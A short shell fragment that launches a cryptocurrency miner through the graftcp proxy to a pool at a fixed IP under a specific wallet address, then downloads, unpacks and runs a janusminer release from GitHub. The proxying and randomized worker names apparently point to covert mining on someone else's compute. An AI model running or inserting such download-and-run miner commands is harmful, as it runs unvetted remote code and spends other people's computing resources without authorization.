...
./graftcp/graftcp ./wart-miner -h 81.163.20.40 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.$(shuf -n 1 -i 1-99999)-col -t4 & wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer_hiveos-0.2.7.tgz && tar -xvf janusminer_hiveos-0.2.7.tgz && cd janusminer_hiveos && ./wart-miner -h 81.163.20.40 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.cok -t20